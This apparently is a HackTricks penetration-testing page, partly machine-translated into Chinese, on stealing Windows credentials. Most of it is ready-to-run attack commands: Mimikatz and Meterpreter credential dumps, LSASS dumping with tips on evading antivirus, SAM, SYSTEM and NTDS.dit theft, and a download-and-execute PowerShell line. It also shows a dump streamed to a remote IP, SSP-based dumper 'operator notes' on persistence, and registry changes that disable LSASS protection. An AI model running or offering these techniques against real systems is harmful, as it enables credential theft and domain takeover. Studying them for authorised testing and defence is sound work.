# 窃取 Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**查找 Mimikatz 可做的其他事情** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **这些保护措施可能会阻止 Mimikatz 提取某些凭证。**

## 使用 Meterpreter 的凭证

使用 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **我创建的** 来在受害者主机上 **搜索密码和哈希**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

由于 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**，它不会被 Defender 检测到。\
你可以使用该工具对 **dump the lsass process**、**download the dump** 并从该 dump **extract** **credentials locally**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
该过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe to dump lsass.exe** 识别为 **恶意**，这是因为它们会检测到字符串 **"procdump.exe" and "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为 **参数** 传递给 procdump，而不是使用名称 lsass.exe，会更 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

一个名为 **comsvcs.dll** 的 DLL，位于 `C:\Windows\System32`，负责在崩溃时转储进程内存。该 DLL 包含一个名为 **`MiniDumpW`** 的函数，可通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三部分。要转储的进程 ID 为第一部分，转储文件的位置为第二部分，第三部分严格为单词 **full**，没有其他选项。\
解析这三部分后，DLL 会创建转储文件并将指定进程的内存写入该文件。\
使用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传并执行 procdump。该方法在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) 有详细说明。

下面使用的命令如下：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**你可以使用此过程自动化** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **使用 Task Manager 转储 lsass**

1. 在 Task Bar 上右键单击并点击 Task Manager
2. 点击 More details
3. 在 Processes 选项卡中搜索 "Local Security Authority Process" 进程
4. 在 "Local Security Authority Process" 进程上右键单击并点击 "Create dump file"。

### **使用 procdump 转储 lsass**

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个 Protected Process Dumper Tool，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。

**主要功能**：

1. 绕过 PPL 保护
2. 混淆内存转储文件以规避 Defender 的基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传内存转储而不将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon 提供了一个三阶段的 dumper，名为 **LalsDumper**，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR 钩子不会触发：

1. **Stage 1 loader (`lals.exe`)** – 搜索 `fdp.dll` 中由 32 个小写 `d` 字符组成的占位符，将其覆盖为 `rtu.txt` 的绝对路径，将修补后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将该恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **Stage 2 inside LSASS** – 当 **LSASS** 加载 `nfdp.dll` 时，DLL 读取 `rtu.txt`，对每个字节执行 XOR 0x20，并将解码后的 blob 映射到内存中，然后转移执行。
3. **Stage 3 dumper** – 映射的 payload 重新实现了 MiniDump 逻辑，使用从哈希 API 名称解析出的 **direct syscalls**（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。一个名为 `Tom` 的专用导出会打开 `%TEMP%\<pid>.ddt`，将压缩的 LSASS dump 流式写入该文件，然后关闭句柄，以便稍后进行 exfiltration。

Operator notes:

* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 秘密
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 转储 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 的密码历史
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 帐户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 窃取 SAM & SYSTEM

这些文件应该 **位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但 **你不能以常规方式直接复制它们**，因为它们受保护。

### 从注册表

窃取这些文件最简单的方法是从注册表中获取一份副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载** 那些文件到你的 Kali 机器上，并使用以下命令 **提取 hashes**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

你可以使用此服务复制受保护的文件。你需要具有 Administrator 权限。

#### 使用 vssadmin

vssadmin 二进制仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但你也可以在 **Powershell** 中执行相同操作。下面示例说明 **如何复制 SAM file**（所用硬盘为 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
书中代码： [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: 该表负责存储有关用户和组等对象的详细信息。
- **Link Table**: 它跟踪关系，例如组成员关系。
- **SD Table**: 存放每个对象的安全描述符，确保存储对象的安全性和访问控制。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM file** 的副本（同样，[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 提取哈希**

一旦你获得了 **NTDS.dit** 和 **SYSTEM** 文件，就可以使用像 _secretsdump.py_ 这样的工具来 **提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你也可以使用一个有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 进行提取。

最后，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

NTDS 对象可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 提取到 SQLite 数据库。不仅会提取 secrets，还会提取整个对象及其属性，以便在已检索到原始 NTDS.dit 文件时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
```
lazagne.exe all
```
## 其他用于从 SAM 和 LSASS 提取凭证的工具

### Windows credentials Editor (WCE)

该工具可用于从内存中提取凭证。下载自: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭证
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件提取凭证
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **执行它**，密码就会被提取。

## 挖掘空闲 RDP 会话并削弱安全控制

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

一旦你知道哪个域管理员经常连接，在他们的**已断开**会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM fallback 会把他们的 verifier 和 tokens 留在 LSASS 中，然后可以通过 SMB/WinRM 重放以获取 `NTDS.dit` 或在域控制器上部署持久化。

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制进行 credential/ticket reuse，从而启用 pass-the-hash 风格的 pivots。
* `LocalAccountTokenFilterPolicy=1` 禁用 UAC token filtering，使本地管理员在网络上获得不受限制的 tokens。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，为攻击者提供另一个内置的高权限账户。
* `RunAsPPL=0` 移除 LSASS PPL 保护，使内存访问对像 LalsDumper 这样的 dumpers 变得轻而易举。

## 参考资料

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
